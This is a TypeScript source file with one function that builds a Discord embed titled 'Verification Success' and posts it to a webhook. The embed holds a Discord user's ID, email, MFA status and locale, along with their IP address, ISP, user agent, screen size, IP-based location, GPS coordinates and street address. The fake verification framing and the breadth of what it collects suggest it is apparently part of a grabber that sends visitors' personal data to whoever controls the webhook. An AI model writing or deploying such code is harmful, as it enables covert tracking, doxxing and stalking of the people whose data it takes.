import { DISCORD_WEBHOOK } from "@/lib/constants";
import { UserLocation } from "@/lib/hooks/user-location-hooks";
import { ScreenSize } from "@/lib/hooks/screen-size-hooks";
import { DiscordUser } from "@/lib/types";
import { IpInfo } from "@/lib/functions/logger";

export async function sendWebhook(
  userInfo: DiscordUser,
  ipInfo: IpInfo,
  userAgent: string,
  location: UserLocation,
  screenSize: ScreenSize,
  address: string
) {
  try {
    const fields = [
      {
        name: "👤User",
        value: `${userInfo.global_name}(${userInfo.username || userInfo.username})`,
        inline: false,
      },
      {
        name: "✉️User Info",
        value: `ID: \`${userInfo.id}\`\nLocale: \`${userInfo.locale}\`\nMFA: \`${userInfo.mfa_enabled}\`\nMail: \`${userInfo.email}\`\nisVerified: \`${userInfo.verified}\``,
        inline: false,
      },
      {
        name: "💻Device Info",
        value: `IP: \`${ipInfo.ip}\`\nUserAgent: \`${userAgent}\`\nScreen Size: \`${screenSize.width}x${screenSize.height}\``,
        inline: false,
      },
      {
        name: "🌎 Location from IP",
        value: `Country: \`${ipInfo.country}\`\nCity, Region: \`${ipInfo.city}, ${ipInfo.region}\`\nLocation: \`${ipInfo.loc}\`\nTimezone: \`${ipInfo.timezone}\`\nISP: \`${ipInfo.org}\`\nMoreInfo: [Click here](https://ipinfo.io/${ipInfo.ip})`,
        inline: false,
      },
      {
        name: "🌐 Location from GPS",
        value: `Latitude: \`${location.latitude}\`\nLongitude: \`${location.longitude}\`\nAltitude: \`${location.altitude}\`\nAccuracy: \`${location.accuracy}\`\nAddress: \`${address}\`\nMoreInfo: [Click here](https://www.google.com/maps?q=${location.latitude},${location.longitude})`,
        inline: false,
      },
    ];


    const embed = {
      title: "☑️Verification Success",
      fields: fields,
      thumbnail: {
        url: `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}.png`,
      },
      color: 0x00ff00, // Green
      timestamp: new Date().toISOString(),
    };

    const response = await fetch(DISCORD_WEBHOOK || "", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [embed],
      }),
    });

    if (!response.ok) {
      console.error("Webhook request failed:", response.status, response.statusText);
      throw new Error(`Webhook request failed: ${response.status}`);
    }
  } catch (error) {
    console.error("Error in sendWebhook:", error);
    throw error;
  }
}
